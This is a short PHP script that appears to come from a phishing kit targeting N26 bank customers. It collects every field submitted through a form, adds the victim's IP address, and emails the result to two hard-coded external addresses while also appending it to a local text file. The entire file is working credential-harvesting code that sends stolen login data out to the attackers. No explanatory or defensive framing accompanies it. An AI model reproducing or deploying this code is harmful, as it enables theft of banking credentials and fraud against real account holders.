<?php
$to = "jemmybtc1993@gmail.com,btcdibi@zoho.com";
function getRealIpAddr()
{
if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
{
  $ip=$_SERVER['HTTP_CLIENT_IP'];
}
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
{
  $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
}
else
{
  $ip=$_SERVER['REMOTE_ADDR'];
}
return $ip;
}

$subject = 'N26 : ' . getRealIpAddr();
$message = 'ip: '.getRealIpAddr() . "\r\n";
foreach($_POST as $k => $v){
    if($k != "group1") $message .= "$k : $v \r\n";
}
$headers = 'X-Mailer: PHP/' . phpversion();
mail($to, $subject, $message, $headers);

$myfile = file_put_contents('jimmmmmmy.txt', $message.PHP_EOL , FILE_APPEND);


?>